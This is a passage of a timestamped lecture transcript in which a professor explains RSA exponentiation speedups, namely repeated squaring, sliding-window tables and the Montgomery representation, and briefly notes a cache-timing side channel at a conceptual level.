              <text_slice>to be pretty much inevitable.</text_slice>
            </slice>
            <slice>
              <time_slice>27:09</time_slice>
              <text_slice>But what the sliding windows
optimization is trying do</text_slice>
            </slice>
            <slice>
              <time_slice>27:13</time_slice>
              <text_slice>is reduce the overhead of
multiplying by this extra c</text_slice>
            </slice>
            <slice>
              <time_slice>27:17</time_slice>
              <text_slice>down here.</text_slice>
            </slice>
            <slice>
              <time_slice>27:18</time_slice>
              <text_slice>So suppose if you
have some number that</text_slice>
            </slice>
            <slice>
              <time_slice>27:21</time_slice>
              <text_slice>has several 1 bits in the
exponent, for every 1 bit</text_slice>
            </slice>
            <slice>
              <time_slice>27:25</time_slice>
              <text_slice>in the exponent in the
binder of presentation,</text_slice>
            </slice>
            <slice>
              <time_slice>27:27</time_slice>
              <text_slice>you're going to have do this
step instead of this step.</text_slice>
            </slice>
            <slice>
              <time_slice>27:30</time_slice>
              <text_slice>Because for every
odd number, you're</text_slice>
            </slice>
            <slice>
              <time_slice>27:33</time_slice>
              <text_slice>going to have to multiply by c.</text_slice>
            </slice>
            <slice>
              <time_slice>27:34</time_slice>
              <text_slice>So these guys would like to not
multiply by this c as often.</text_slice>
            </slice>
            <slice>
              <time_slice>27:37</time_slice>
              <text_slice>So the plan is to precompute
different powers of c.</text_slice>
            </slice>
            <slice>
              <time_slice>27:44</time_slice>
              <text_slice>So what we're going
to do is we're</text_slice>
            </slice>
            <slice>
              <time_slice>27:46</time_slice>
              <text_slice>going to generate
a table that says,</text_slice>
            </slice>
            <slice>
              <time_slice>27:48</time_slice>
              <text_slice>well, here's the value of c
to the x-- sorry, c to the 1--</text_slice>
            </slice>
            <slice>
              <time_slice>27:53</time_slice>
              <text_slice>here's the value of c
to the 3, c to the 7.</text_slice>
            </slice>
            <slice>
              <time_slice>27:56</time_slice>
              <text_slice>And I think
[? in open ?] as a cell,</text_slice>
            </slice>
            <slice>
              <time_slice>27:57</time_slice>
              <text_slice>it goes up to c to the 31st.</text_slice>
            </slice>
            <slice>
              <time_slice>28:02</time_slice>
              <text_slice>So this table is
going to just be</text_slice>
            </slice>
            <slice>
              <time_slice>28:04</time_slice>
              <text_slice>precomputed when you want to
do some modular exponentiation.</text_slice>
            </slice>
            <slice>
              <time_slice>28:08</time_slice>
              <text_slice>You're going to precompute
all the slots in this table.</text_slice>
            </slice>
            <slice>
              <time_slice>28:11</time_slice>
              <text_slice>And then when you want to do
this exponentiation, instead</text_slice>
            </slice>
            <slice>
              <time_slice>28:14</time_slice>
              <text_slice>of doing the repeated squaring
and multiplying by this c</text_slice>
            </slice>
            <slice>
              <time_slice>28:16</time_slice>
              <text_slice>every time,</text_slice>
            </slice>
            <slice>
              <time_slice>28:18</time_slice>
              <text_slice>You're going to use
a different formula.</text_slice>
            </slice>
            <slice>
              <time_slice>28:20</time_slice>
              <text_slice>It says as well if you have
c to the 32x plus some y,</text_slice>
            </slice>
            <slice>
              <time_slice>28:26</time_slice>
              <text_slice>well you can do c
to the x, and you</text_slice>
            </slice>
            <slice>
              <time_slice>28:29</time_slice>
              <text_slice>can do repeated squaring--
very much like before-- this</text_slice>
            </slice>
            <slice>
              <time_slice>28:33</time_slice>
              <text_slice>is to get the 32, there's
like 5 powers of 2 here</text_slice>
            </slice>
            <slice>
              <time_slice>28:38</time_slice>
              <text_slice>times c to the y.</text_slice>
            </slice>
            <slice>
              <time_slice>28:41</time_slice>
              <text_slice>And c to the y, you can
get out of this table.</text_slice>
            </slice>
            <slice>
              <time_slice>28:44</time_slice>
              <text_slice>So you can see that we're doing
the same number of squaring</text_slice>
            </slice>
            <slice>
              <time_slice>28:46</time_slice>
              <text_slice>as before here.</text_slice>
            </slice>
            <slice>
              <time_slice>28:48</time_slice>
              <text_slice>But we don't have to
multiply by c as many times.</text_slice>
            </slice>
            <slice>
              <time_slice>28:52</time_slice>
              <text_slice>You're going to fish
it out of this table</text_slice>
            </slice>
            <slice>
              <time_slice>28:54</time_slice>
              <text_slice>and do several multiplies
by c for the cost</text_slice>
            </slice>
            <slice>
              <time_slice>28:56</time_slice>
              <text_slice>of a single multiply.</text_slice>
            </slice>
            <slice>
              <time_slice>28:59</time_slice>
              <text_slice>This make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>29:00</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>29:00</time_slice>
              <text_slice>AUDIENCE: How do you determine
x and y in the first place?</text_slice>
            </slice>
            <slice>
              <time_slice>29:03</time_slice>
              <text_slice>PROFESSOR: How do determine y?</text_slice>
            </slice>
            <slice>
              <time_slice>29:05</time_slice>
              <text_slice>AUDIENCE: X and y.</text_slice>
            </slice>
            <slice>
              <time_slice>29:06</time_slice>
              <text_slice>PROFESSOR: Oh, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>29:07</time_slice>
              <text_slice>So let's look at that.</text_slice>
            </slice>
            <slice>
              <time_slice>29:08</time_slice>
              <text_slice>So for repeated
squaring, well actually</text_slice>
            </slice>
            <slice>
              <time_slice>29:13</time_slice>
              <text_slice>in both cases,
what you want to do</text_slice>
            </slice>
            <slice>
              <time_slice>29:14</time_slice>
              <text_slice>is you want to look
at the exponent</text_slice>
            </slice>
            <slice>
              <time_slice>29:17</time_slice>
              <text_slice>that you're trying to use
in a binary representation.</text_slice>
            </slice>
            <slice>
              <time_slice>29:21</time_slice>
              <text_slice>So suppose I'm trying to compute
the value of c to the exponent,</text_slice>
            </slice>
            <slice>
              <time_slice>29:26</time_slice>
              <text_slice>I don't know, 1 0 1 1 0 1 0,
and maybe there's more bits.</text_slice>
            </slice>
            <slice>
              <time_slice>29:32</time_slice>
              <text_slice>OK, so if we wanted to
do repeated squaring,</text_slice>
            </slice>
            <slice>
              <time_slice>29:35</time_slice>
              <text_slice>then you look at the
lowest bit here-- it's 0.</text_slice>
            </slice>
            <slice>
              <time_slice>29:38</time_slice>
              <text_slice>So what you're
going to write down</text_slice>
            </slice>
            <slice>
              <time_slice>29:39</time_slice>
              <text_slice>is this is equal to c to
the 1 0 1 1 0 1 squared.</text_slice>
            </slice>
            <slice>
              <time_slice>29:46</time_slice>
              <text_slice>OK, so now if only
you knew this value,</text_slice>
            </slice>
            <slice>
              <time_slice>29:49</time_slice>
              <text_slice>then you could just square it.</text_slice>
            </slice>
            <slice>
              <time_slice>29:50</time_slice>
              <text_slice>OK, now we're going to compute
this guy, so c to the 1 0 1 1</text_slice>
            </slice>
            <slice>
              <time_slice>29:54</time_slice>
              <text_slice>0 1 is equal to-- well
here we can't use this rule</text_slice>
            </slice>
            <slice>
              <time_slice>29:57</time_slice>
              <text_slice>because it's not 2x-- it's
going to be to the x plus 1.</text_slice>
            </slice>
            <slice>
              <time_slice>30:00</time_slice>
              <text_slice>So now we're going to write
this is c to the 1 0 1 1 0</text_slice>
            </slice>
            <slice>
              <time_slice>30:06</time_slice>
              <text_slice>squared times another c.</text_slice>
            </slice>
            <slice>
              <time_slice>30:09</time_slice>
              <text_slice>Because it's this prefix
times 2 plus this one of m.</text_slice>
            </slice>
            <slice>
              <time_slice>30:15</time_slice>
              <text_slice>That's how you fish it
out for repeated squaring.</text_slice>
            </slice>
            <slice>
              <time_slice>30:17</time_slice>
              <text_slice>And for sliding window,
you just grab more bits</text_slice>
            </slice>
            <slice>
              <time_slice>30:19</time_slice>
              <text_slice>from the low end.</text_slice>
            </slice>
            <slice>
              <time_slice>30:20</time_slice>
              <text_slice>So if you wanted to do the
sliding window trick here</text_slice>
            </slice>
            <slice>
              <time_slice>30:24</time_slice>
              <text_slice>instead of taking
one c out, suppose</text_slice>
            </slice>
            <slice>
              <time_slice>30:27</time_slice>
              <text_slice>we do-- instead of this
giant table-- maybe</text_slice>
            </slice>
            <slice>
              <time_slice>30:29</time_slice>
              <text_slice>we do 3 bits at a time.</text_slice>
            </slice>
            <slice>
              <time_slice>30:30</time_slice>
              <text_slice>So we go off to c to the 7th.</text_slice>
            </slice>
            <slice>
              <time_slice>30:32</time_slice>
              <text_slice>So here you would
grab the first 3 bits,</text_slice>
            </slice>
            <slice>
              <time_slice>30:36</time_slice>
              <text_slice>and that's what you would
compute here: c to the 1</text_slice>
            </slice>
            <slice>
              <time_slice>30:40</time_slice>
              <text_slice>0 1 to the 8th power.</text_slice>
            </slice>
            <slice>
              <time_slice>30:42</time_slice>
              <text_slice>And then, the rest is c
to the 1 0 1 power here.</text_slice>
            </slice>
            <slice>
              <time_slice>30:47</time_slice>
              <text_slice>It's a little unfortunate
these are the same thing,</text_slice>
            </slice>
            <slice>
              <time_slice>30:50</time_slice>
              <text_slice>but really there's
more bits here.</text_slice>
            </slice>
            <slice>
              <time_slice>30:53</time_slice>
              <text_slice>But here, this is
the thing that you're</text_slice>
            </slice>
            <slice>
              <time_slice>30:54</time_slice>
              <text_slice>going to look up in the table.</text_slice>
            </slice>
            <slice>
              <time_slice>30:55</time_slice>
              <text_slice>This is c to the 5th in decimal.</text_slice>
            </slice>
            <slice>
              <time_slice>30:57</time_slice>
              <text_slice>And this says you're going to
keep doing the sliding window</text_slice>
            </slice>
            <slice>
              <time_slice>31:00</time_slice>
              <text_slice>to compute this value.</text_slice>
            </slice>
            <slice>
              <time_slice>31:03</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>31:05</time_slice>
              <text_slice>This just saves
on how many times</text_slice>
            </slice>
            <slice>
              <time_slice>31:06</time_slice>
              <text_slice>you have to multiply
by c by pre-multiplying</text_slice>
            </slice>
            <slice>
              <time_slice>31:08</time_slice>
              <text_slice>it a bunch of times.</text_slice>
            </slice>
            <slice>
              <time_slice>31:10</time_slice>
              <text_slice>[? And the cell guys ?]
at least 10 years ago</text_slice>
            </slice>
            <slice>
              <time_slice>31:12</time_slice>
              <text_slice>thought that going
up to 32 power</text_slice>
            </slice>
            <slice>
              <time_slice>31:16</time_slice>
              <text_slice>was the best plan in
terms of efficiency</text_slice>
            </slice>
            <slice>
              <time_slice>31:18</time_slice>
              <text_slice>because there's some
trade off here, right?</text_slice>
            </slice>
            <slice>
              <time_slice>31:20</time_slice>
              <text_slice>You spend time
preconfiguring this table,</text_slice>
            </slice>
            <slice>
              <time_slice>31:21</time_slice>
              <text_slice>but then if this
table is too giant,</text_slice>
            </slice>
            <slice>
              <time_slice>31:24</time_slice>
              <text_slice>you're not going to
use some entries,</text_slice>
            </slice>
            <slice>
              <time_slice>31:25</time_slice>
              <text_slice>because if you run
this table out to,</text_slice>
            </slice>
            <slice>
              <time_slice>31:28</time_slice>
              <text_slice>I don't know, c to the 128
but you're computing just</text_slice>
            </slice>
            <slice>
              <time_slice>31:31</time_slice>
              <text_slice>like 500 [? full bit ?]
exponents,</text_slice>
            </slice>
            <slice>
              <time_slice>31:33</time_slice>
              <text_slice>maybe you're not going
to use all these entries.</text_slice>
            </slice>
            <slice>
              <time_slice>31:35</time_slice>
              <text_slice>So it's gonna be
a waste of time.</text_slice>
            </slice>
            <slice>
              <time_slice>31:36</time_slice>
              <text_slice>Question.</text_slice>
            </slice>
            <slice>
              <time_slice>31:37</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]
Is there a reason</text_slice>
            </slice>
            <slice>
              <time_slice>31:41</time_slice>
              <text_slice>not to compute the
table [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>31:44</time_slice>
              <text_slice>[INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>31:49</time_slice>
              <text_slice>PROFESSOR: It ends
up being the case</text_slice>
            </slice>
            <slice>
              <time_slice>31:52</time_slice>
              <text_slice>that you don't want to-- well
there's two things going on.</text_slice>
            </slice>
            <slice>
              <time_slice>31:57</time_slice>
              <text_slice>One is that you'll have now code
to check whether the entry is</text_slice>
            </slice>
            <slice>
              <time_slice>32:01</time_slice>
              <text_slice>filled in or not, and that'll
probably reduce your branch</text_slice>
            </slice>
            <slice>
              <time_slice>32:05</time_slice>
              <text_slice>predictor accuracy
on the CPU So it</text_slice>
            </slice>
            <slice>
              <time_slice>32:07</time_slice>
              <text_slice>will run slower
in the common case</text_slice>
            </slice>
            <slice>
              <time_slice>32:09</time_slice>
              <text_slice>because if you [INAUDIBLE]
with the entries there.</text_slice>
            </slice>
            <slice>
              <time_slice>32:11</time_slice>
              <text_slice>Another slightly
annoying thing is</text_slice>
            </slice>
            <slice>
              <time_slice>32:13</time_slice>
              <text_slice>that it turns out
this entry leaks stuff</text_slice>
            </slice>
            <slice>
              <time_slice>32:15</time_slice>
              <text_slice>through a different
side-channel, namely</text_slice>
            </slice>
            <slice>
              <time_slice>32:18</time_slice>
              <text_slice>cache access patterns.</text_slice>
            </slice>
            <slice>
              <time_slice>32:20</time_slice>
              <text_slice>So if you have some other
process on the same CPU,</text_slice>
            </slice>
            <slice>
              <time_slice>32:23</time_slice>
              <text_slice>you can sort of see which
cache addresses are getting</text_slice>
            </slice>
            <slice>
              <time_slice>32:26</time_slice>
              <text_slice>evicted out of the cache or are
slower because someone accessed</text_slice>
            </slice>
            <slice>
              <time_slice>32:30</time_slice>
              <text_slice>this entry or this entry.</text_slice>
            </slice>
            <slice>
              <time_slice>32:32</time_slice>
              <text_slice>And the bigger this
table gets, the easier</text_slice>
            </slice>
            <slice>
              <time_slice>32:35</time_slice>
              <text_slice>it is to tell what the
exponent bits were.</text_slice>
            </slice>
            <slice>
              <time_slice>32:38</time_slice>
              <text_slice>In the limit, this table is
gigantic and just telling,</text_slice>
            </slice>
            <slice>
              <time_slice>32:42</time_slice>
              <text_slice>just being able to tell which
cache address on this CPU</text_slice>
            </slice>
            <slice>
              <time_slice>32:47</time_slice>
              <text_slice>had a [? miss ?] tells you that
the encryption process must</text_slice>
            </slice>
            <slice>
              <time_slice>32:50</time_slice>
              <text_slice>have accessed that
entry in the table.</text_slice>
            </slice>
            <slice>
              <time_slice>32:51</time_slice>
              <text_slice>And tells you that, oh that long
bit sequence appears somewhere</text_slice>
            </slice>
            <slice>
              <time_slice>32:55</time_slice>
              <text_slice>in your secret key exponent.</text_slice>
            </slice>
            <slice>
              <time_slice>32:58</time_slice>
              <text_slice>So I guess the answer
isn't mathematically</text_slice>
            </slice>
            <slice>
              <time_slice>33:00</time_slice>
              <text_slice>you could totally fill
this in on demand.</text_slice>
            </slice>
            <slice>
              <time_slice>33:03</time_slice>
              <text_slice>In practice, you probably
don't want it to be that giant.</text_slice>
            </slice>
            <slice>
              <time_slice>33:06</time_slice>
              <text_slice>And also, if you have
it's particularly giant,</text_slice>
            </slice>
            <slice>
              <time_slice>33:08</time_slice>
              <text_slice>you aren't going to be able to
use entries as efficiently as</text_slice>
            </slice>
            <slice>
              <time_slice>33:12</time_slice>
              <text_slice>well.</text_slice>
            </slice>
            <slice>
              <time_slice>33:13</time_slice>
              <text_slice>You can reuse these
entries as you're</text_slice>
            </slice>
            <slice>
              <time_slice>33:14</time_slice>
              <text_slice>computing. [INAUDIBLE]
It's not actually</text_slice>
            </slice>
            <slice>
              <time_slice>33:16</time_slice>
              <text_slice>that expensive because
you use c to the cubed</text_slice>
            </slice>
            <slice>
              <time_slice>33:19</time_slice>
              <text_slice>when you're computing c to the
7th and so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>33:23</time_slice>
              <text_slice>It's not that bad.</text_slice>
            </slice>
            <slice>
              <time_slice>33:25</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>33:26</time_slice>
              <text_slice>Other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>33:30</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>33:31</time_slice>
              <text_slice>So this is the repeated
squaring and sliding</text_slice>
            </slice>
            <slice>
              <time_slice>33:35</time_slice>
              <text_slice>window optimization that
open [? a cell ?] implements</text_slice>
            </slice>
            <slice>
              <time_slice>33:41</time_slice>
              <text_slice>[INAUDIBLE] I don't actually
know whether they still</text_slice>
            </slice>
            <slice>
              <time_slice>33:43</time_slice>
              <text_slice>have the same size of the
sliding window or not.</text_slice>
            </slice>
            <slice>
              <time_slice>33:46</time_slice>
              <text_slice>But it does actually give
you a fair bit of speed up.</text_slice>
            </slice>
            <slice>
              <time_slice>33:48</time_slice>
              <text_slice>So before you had to square
for every bit in the exponent.</text_slice>
            </slice>
            <slice>
              <time_slice>33:53</time_slice>
              <text_slice>And then you'd have to have
a multiply for every 1 bit.</text_slice>
            </slice>
            <slice>
              <time_slice>33:57</time_slice>
              <text_slice>So if you have a 500
bit exponent then</text_slice>
            </slice>
            <slice>
              <time_slice>33:59</time_slice>
              <text_slice>you're going to do 500
squarings and, on average,</text_slice>
            </slice>
            <slice>
              <time_slice>34:02</time_slice>
              <text_slice>roughly 256
multiplications by c.</text_slice>
            </slice>
            <slice>
              <time_slice>34:06</time_slice>
              <text_slice>So with sliding
windows, you're going</text_slice>
            </slice>
            <slice>
              <time_slice>34:07</time_slice>
              <text_slice>to still do the 512
squarings because there's</text_slice>
            </slice>
            <slice>
              <time_slice>34:11</time_slice>
              <text_slice>no getting around that.</text_slice>
            </slice>
            <slice>
              <time_slice>34:13</time_slice>
              <text_slice>But instead of doing
256 multiplies by c,</text_slice>
            </slice>
            <slice>
              <time_slice>34:16</time_slice>
              <text_slice>you're going to
hopefully do way fewer,</text_slice>
            </slice>
            <slice>
              <time_slice>34:19</time_slice>
              <text_slice>maybe something on the
order of 32 [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>34:21</time_slice>
              <text_slice>multiplies by some
entry in this table.</text_slice>
            </slice>
            <slice>
              <time_slice>34:24</time_slice>
              <text_slice>So that's the general plan.</text_slice>
            </slice>
            <slice>
              <time_slice>34:27</time_slice>
              <text_slice>[INAUDIBLE] Not as
dramatic as CRT, not 2x,</text_slice>
            </slice>
            <slice>
              <time_slice>34:31</time_slice>
              <text_slice>but it could save
you like almost 1.5x.</text_slice>
            </slice>
            <slice>
              <time_slice>34:37</time_slice>
              <text_slice>All depending on exactly
what [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>34:40</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>34:42</time_slice>
              <text_slice>Another question about this?</text_slice>
            </slice>
            <slice>
              <time_slice>34:45</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>34:47</time_slice>
              <text_slice>So these are the [? roughly ?]
easier optimizations.</text_slice>
            </slice>
            <slice>
              <time_slice>34:50</time_slice>
              <text_slice>And then there's
two clever tricks</text_slice>
            </slice>
            <slice>
              <time_slice>34:53</time_slice>
              <text_slice>playing with numbers for how to
do just a multiplication more</text_slice>
            </slice>
            <slice>
              <time_slice>34:57</time_slice>
              <text_slice>efficiently.</text_slice>
            </slice>
            <slice>
              <time_slice>34:59</time_slice>
              <text_slice>So the first one of
these optimizations</text_slice>
            </slice>
            <slice>
              <time_slice>35:01</time_slice>
              <text_slice>that we're going to
look at-- I think</text_slice>
            </slice>
            <slice>
              <time_slice>35:04</time_slice>
              <text_slice>I'll raise this board--
is called this Montgomery</text_slice>
            </slice>
            <slice>
              <time_slice>35:08</time_slice>
              <text_slice>representation.</text_slice>
            </slice>
            <slice>
              <time_slice>35:09</time_slice>
              <text_slice>And we'll see in
a second why it's</text_slice>
            </slice>
            <slice>
              <time_slice>35:13</time_slice>
              <text_slice>particularly important for us.</text_slice>
            </slice>
            <slice>
              <time_slice>35:23</time_slice>
              <text_slice>So the problem that this
Montgomery representation</text_slice>
            </slice>
            <slice>
              <time_slice>35:26</time_slice>
              <text_slice>optimization is
trying to solve for us</text_slice>
            </slice>
            <slice>
              <time_slice>35:29</time_slice>
              <text_slice>is the fact that every
time we do a multiply,</text_slice>
            </slice>
            <slice>
              <time_slice>35:33</time_slice>
              <text_slice>we get a number
that keeps growing</text_slice>
            </slice>
            <slice>
              <time_slice>35:34</time_slice>
              <text_slice>and growing and growing.</text_slice>
            </slice>
            <slice>
              <time_slice>35:36</time_slice>
              <text_slice>In particular, both
in sliding windows</text_slice>
            </slice>
            <slice>
              <time_slice>35:40</time_slice>
              <text_slice>or in repeated
squaring, actually when</text_slice>
            </slice>
            <slice>
              <time_slice>35:43</time_slice>
              <text_slice>you square you multiply
2 numbers together,</text_slice>
            </slice>
            <slice>
              <time_slice>35:46</time_slice>
              <text_slice>when you multiply
by c to the y, you</text_slice>
            </slice>
            <slice>
              <time_slice>35:47</time_slice>
              <text_slice>multiply 2 numbers together.</text_slice>
            </slice>
            <slice>
              <time_slice>35:48</time_slice>
              <text_slice>And the problem is that if the
inputs to the multiplication</text_slice>
            </slice>
            <slice>
              <time_slice>35:53</time_slice>
              <text_slice>were, let's say, 512 bits each.</text_slice>
            </slice>
            <slice>
              <time_slice>35:56</time_slice>
              <text_slice>Then the result of
the multiplication</text_slice>
            </slice>
            <slice>
              <time_slice>35:59</time_slice>
              <text_slice>is going to be 1,000 bits.</text_slice>
            </slice>
            <slice>
              <time_slice>36:01</time_slice>
              <text_slice>And then you'd take
this 1,000 bit result</text_slice>
            </slice>
            <slice>
              <time_slice>36:03</time_slice>
              <text_slice>and you multiply it
again by something</text_slice>
            </slice>
            <slice>
              <time_slice>36:04</time_slice>
              <text_slice>like five [INAUDIBLE] bits.</text_slice>
            </slice>
            <slice>
              <time_slice>36:05</time_slice>
              <text_slice>And now it's 1,500 bits,
2,000 bits, 2,500 bits,</text_slice>
            </slice>
            <slice>
              <time_slice>36:08</time_slice>
              <text_slice>and it keeps
growing and growing.</text_slice>
            </slice>
            <slice>
              <time_slice>36:10</time_slice>
              <text_slice>And you really don't want
this because multiplications</text_slice>
            </slice>
            <slice>
              <time_slice>36:13</time_slice>
              <text_slice>[? quadratic ?] in the size of
the number we're multiplying.</text_slice>
            </slice>
            <slice>
              <time_slice>36:17</time_slice>
              <text_slice>So we have to keep
the size of our number</text_slice>
            </slice>
            <slice>
              <time_slice>36:19</time_slice>
              <text_slice>as small as possible,
which means basically 512</text_slice>
            </slice>
            <slice>
              <time_slice>36:21</time_slice>
              <text_slice>bits because all this
computation is mod p or mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>36:27</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>36:28</time_slice>
              <text_slice>AUDIENCE: What do
you want [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>36:31</time_slice>
              <text_slice>PROFESSOR: That's right, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>36:33</time_slice>
              <text_slice>So the cool thing is that
we can keep this number down</text_slice>
            </slice>
            <slice>
              <time_slice>36:36</time_slice>
              <text_slice>because what we
do is, let's say,</text_slice>
            </slice>
            <slice>
              <time_slice>36:37</time_slice>
              <text_slice>we want to compute c to the
x just for this example.</text_slice>
            </slice>
            <slice>
              <time_slice>36:40</time_slice>
              <text_slice>Squared.</text_slice>
            </slice>
            <slice>
              <time_slice>36:41</time_slice>
              <text_slice>Squared again.</text_slice>
            </slice>
            <slice>
              <time_slice>36:43</time_slice>
              <text_slice>Squared again.</text_slice>
            </slice>
            <slice>
              <time_slice>36:44</time_slice>
              <text_slice>What you could do is
you compute c to the x</text_slice>
            </slice>
            <slice>
              <time_slice>36:46</time_slice>
              <text_slice>then you take mod
p, let's say, right.</text_slice>
            </slice>
            <slice>
              <time_slice>36:49</time_slice>
              <text_slice>Then you square it then
you do mod p again.</text_slice>
            </slice>
            <slice>
              <time_slice>36:53</time_slice>
              <text_slice>Then you square it again,
and then you do mod p again.</text_slice>
            </slice>
            <slice>
              <time_slice>36:56</time_slice>
              <text_slice>And so on.</text_slice>
            </slice>
            <slice>
              <time_slice>36:57</time_slice>
              <text_slice>So this is basically
what you're proposing.</text_slice>
            </slice>
            <slice>
              <time_slice>36:59</time_slice>
              <text_slice>So this is great.</text_slice>
            </slice>
            <slice>
              <time_slice>37:00</time_slice>
              <text_slice>In fact, this keeps
it size of our numbers</text_slice>
            </slice>
            <slice>
              <time_slice>37:02</time_slice>
              <text_slice>to basically five total
bits, which is about as</text_slice>
            </slice>
            <slice>
              <time_slice>37:05</time_slice>
              <text_slice>small as we can get.</text_slice>
            </slice>
            <slice>
              <time_slice>37:06</time_slice>
              <text_slice>This is good in
terms of keeping down</text_slice>
            </slice>
            <slice>
              <time_slice>37:08</time_slice>
              <text_slice>the size of these numbers
for multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>37:11</time_slice>
              <text_slice>But it's actually kind of
expensive to do this mod p</text_slice>
            </slice>
            <slice>
              <time_slice>37:15</time_slice>
              <text_slice>operation.</text_slice>
            </slice>
            <slice>
              <time_slice>37:16</time_slice>
              <text_slice>Because the way that you
do mod p something is</text_slice>
            </slice>
            <slice>
              <time_slice>37:19</time_slice>
              <text_slice>you basically have
to do division.</text_slice>
            </slice>
            <slice>
              <time_slice>37:21</time_slice>
              <text_slice>And division is way worse
than multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>37:24</time_slice>
              <text_slice>I'm not going to go through
the algorithms for division,</text_slice>
            </slice>
            <slice>
              <time_slice>37:27</time_slice>
              <text_slice>but it's really slow.</text_slice>
            </slice>
            <slice>
              <time_slice>37:30</time_slice>
              <text_slice>You usually want to avoid
division as much as possible.</text_slice>
            </slice>
            <slice>
              <time_slice>37:33</time_slice>
              <text_slice>Because it's not even just a
straightforward programming</text_slice>
            </slice>
            <slice>
              <time_slice>37:36</time_slice>
              <text_slice>thing, you have to do some
approximation algorithm,</text_slice>
            </slice>
            <slice>
              <time_slice>37:39</time_slice>
              <text_slice>some sort of Newton's
method of some sort</text_slice>
            </slice>
            <slice>
              <time_slice>37:41</time_slice>
              <text_slice>and just keep it [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>37:43</time_slice>
              <text_slice>It's going to be slow.</text_slice>
            </slice>
            <slice>
              <time_slice>37:44</time_slice>
              <text_slice>And in the main
implementation, this actually</text_slice>
            </slice>
            <slice>
              <time_slice>37:47</time_slice>
              <text_slice>turns out to be the slowest
part of doing multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>37:50</time_slice>
              <text_slice>The multiplication is cheap.</text_slice>
            </slice>
            <slice>
              <time_slice>37:52</time_slice>
              <text_slice>But then doing mod p or mod q
to bring it back down in size</text_slice>
            </slice>
            <slice>
              <time_slice>37:56</time_slice>
              <text_slice>is going to be actually more
expensive than the multiplying.</text_slice>
            </slice>
            <slice>
              <time_slice>37:59</time_slice>
              <text_slice>So that's actually
kind of a bummer.</text_slice>
            </slice>
            <slice>
              <time_slice>38:01</time_slice>
              <text_slice>So the way that we're
going to get around this</text_slice>
            </slice>
            <slice>
              <time_slice>38:04</time_slice>
              <text_slice>is by doing this multiplication,
this clever other</text_slice>
            </slice>
            <slice>
              <time_slice>38:08</time_slice>
              <text_slice>representation, and also
I'll show you the trick here.</text_slice>
            </slice>
            <slice>
              <time_slice>38:13</time_slice>
              <text_slice>Let's see.</text_slice>
            </slice>
            <slice>
              <time_slice>38:14</time_slice>
              <text_slice>Bear with me for a
second, and then we'll</text_slice>
            </slice>
            <slice>
              <time_slice>38:16</time_slice>
              <text_slice>and then see why it's so fast
to use this Montgomery trick.</text_slice>
            </slice>
            <slice>
              <time_slice>38:21</time_slice>
              <text_slice>And the basic idea is
to represent numbers,</text_slice>
            </slice>
            <slice>
              <time_slice>38:26</time_slice>
              <text_slice>these are regular numbers
that you might actually</text_slice>
            </slice>
            <slice>
              <time_slice>38:29</time_slice>
              <text_slice>want to multiply.</text_slice>
            </slice>
            <slice>
              <time_slice>38:30</time_slice>
              <text_slice>And we're going to have a
different representation</text_slice>
            </slice>
            <slice>
              <time_slice>38:32</time_slice>
              <text_slice>for these numbers, called the
Montgomery representation.</text_slice>
            </slice>
            <slice>
              <time_slice>38:37</time_slice>
              <text_slice>And that representation
is actually very easy.</text_slice>
            </slice>
            <slice>
              <time_slice>38:41</time_slice>
              <text_slice>We just take the value
a and we multiply it</text_slice>
            </slice>
            <slice>
              <time_slice>38:43</time_slice>
              <text_slice>by some magic value R.</text_slice>
            </slice>
            <slice>
              <time_slice>38:46</time_slice>
              <text_slice>I'll tell you what
this R is in a second.</text_slice>
            </slice>
            <slice>
              <time_slice>38:48</time_slice>
              <text_slice>But let's first figure out if
you pick some arbitrary value</text_slice>
            </slice>
            <slice>
              <time_slice>38:51</time_slice>
              <text_slice>R, what's going to happen here?</text_slice>
            </slice>
            <slice>
              <time_slice>38:53</time_slice>
              <text_slice>So we take 2 numbers, a and b.</text_slice>
            </slice>
            <slice>
              <time_slice>38:56</time_slice>
              <text_slice>Their Montgomery representations
are sort of expectedly.</text_slice>
            </slice>
            <slice>
              <time_slice>39:00</time_slice>
              <text_slice>A is aR, b is bR.</text_slice>
            </slice>
            <slice>
              <time_slice>39:02</time_slice>
              <text_slice>And if you want to compute
the product of a times b,</text_slice>
            </slice>
            <slice>
              <time_slice>39:05</time_slice>
              <text_slice>well in Montgomery
space, you can also</text_slice>
            </slice>
            <slice>
              <time_slice>39:08</time_slice>
              <text_slice>multiply these guys out.</text_slice>
            </slice>
            <slice>
              <time_slice>39:09</time_slice>
              <text_slice>You can take aR
multiply it by bR.</text_slice>
            </slice>
            <slice>
              <time_slice>39:13</time_slice>
              <text_slice>And what you get here
is ab times R squared.</text_slice>
            </slice>
            <slice>
              <time_slice>39:17</time_slice>
              <text_slice>So there are two Rs now.</text_slice>
            </slice>
            <slice>
              <time_slice>39:18</time_slice>
              <text_slice>That's kind of annoying, but
you can divide that by R.</text_slice>
            </slice>
            <slice>
              <time_slice>39:22</time_slice>
              <text_slice>And we get ab times R. So this
is probably weird in a sense</text_slice>
            </slice>
            <slice>
              <time_slice>39:29</time_slice>
              <text_slice>that why would you
multiply this extra number.</text_slice>
            </slice>
            <slice>
